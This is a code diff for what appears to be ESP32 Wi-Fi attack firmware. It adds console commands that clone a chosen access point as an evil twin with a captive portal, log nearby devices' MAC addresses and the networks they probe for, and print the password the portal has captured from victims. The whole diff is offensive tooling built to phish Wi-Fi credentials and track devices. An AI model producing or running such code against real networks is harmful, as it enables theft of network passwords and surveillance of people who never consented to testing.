@@ -25,6 +25,8 @@
 #include "attack_deauth.h"
 #include "attack_pmkid.h"
 #include "attack_handshake.h"
+#include "attack_evil_twin.h"
+#include "webserver.h"
 #include "pcap_serializer.h"
 #include "hccapx_serializer.h"
 #include "storage.h"
@@ -161,6 +163,60 @@ static int cmd_handshake_stop(int argc, char **argv) {
     return 0;
 }
 
+// --- eviltwin ---
+
+static struct {
+    struct arg_int *ap_index;
+    struct arg_end *end;
+} eviltwin_args;
+
+static int cmd_eviltwin(int argc, char **argv) {
+    int nerrors = arg_parse(argc, argv, (void **) &eviltwin_args);
+    if (nerrors != 0) {
+        arg_print_errors(stdout, eviltwin_args.end, argv[0]);
+        return 1;
+    }
+    const wifi_ap_record_t *ap = require_ap(eviltwin_args.ap_index->ival[0]);
+    if (ap == NULL) {
+        return 1;
+    }
+    attack_evil_twin_start(ap);
+    webserver_start(ap);
+    printf("Evil twin + captive portal started, cloning '%s' (open auth). Management AP is offline until 'eviltwin_stop'.\n", ap->ssid);
+    return 0;
+}
+
+static int cmd_eviltwin_stop(int argc, char **argv) {
+    webserver_stop();
+    attack_evil_twin_stop();
+    wifictl_mgmt_ap_start();
+    printf("Evil twin stopped, management AP restored.\n");
+    return 0;
+}
+
+static int cmd_karma_log(int argc, char **argv) {
+    karma_probe_t entries[16];
+    unsigned n = attack_evil_twin_get_probe_log(entries, 16);
+    for (unsigned i = 0; i < n; i++) {
+        karma_probe_t *e = &entries[i];
+        printf("%02x:%02x:%02x:%02x:%02x:%02x  probed for \"%.*s\"\n",
+               e->sta_mac[0], e->sta_mac[1], e->sta_mac[2], e->sta_mac[3], e->sta_mac[4], e->sta_mac[5],
+               e->ssid_len, e->ssid);
+    }
+    printf("%u probe request(s) logged.\n", n);
+    return 0;
+}
+
+static int cmd_creds(int argc, char **argv) {
+    const char *password = webserver_get_captured_password();
+    if (password != NULL) {
+        printf("Captured password: %s\n", password);
+    } else {
+        printf("No password captured yet.\n");
+    }
+    return 0;
+}
+
 // --- status / save ---
 
 static int cmd_status(int argc, char **argv) {
@@ -293,6 +349,37 @@ static void register_commands() {
         .func = &cmd_handshake_stop,
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&handshake_stop_cmd));
+
+    eviltwin_args.ap_index = arg_int1(NULL, NULL, "<index>", "AP index from 'scan'");
+    eviltwin_args.end = arg_end(1);
+    const esp_console_cmd_t eviltwin_cmd = {
+        .command = "eviltwin",
+        .help = "Start rogue AP clone + captive portal against an AP",
+        .func = &cmd_eviltwin,
+        .argtable = &eviltwin_args,
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&eviltwin_cmd));
+
+    const esp_console_cmd_t eviltwin_stop_cmd = {
+        .command = "eviltwin_stop",
+        .help = "Stop evil twin attack and restore the management AP",
+        .func = &cmd_eviltwin_stop,
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&eviltwin_stop_cmd));
+
+    const esp_console_cmd_t karma_log_cmd = {
+        .command = "karma_log",
+        .help = "List probe requests seen by the karma responder",
+        .func = &cmd_karma_log,
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&karma_log_cmd));
+
+    const esp_console_cmd_t creds_cmd = {
+        .command = "creds",
+        .help = "Show the last password captured by the captive portal",
+        .func = &cmd_creds,
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&creds_cmd));
 
     const esp_console_cmd_t status_cmd = {
         .command = "status",
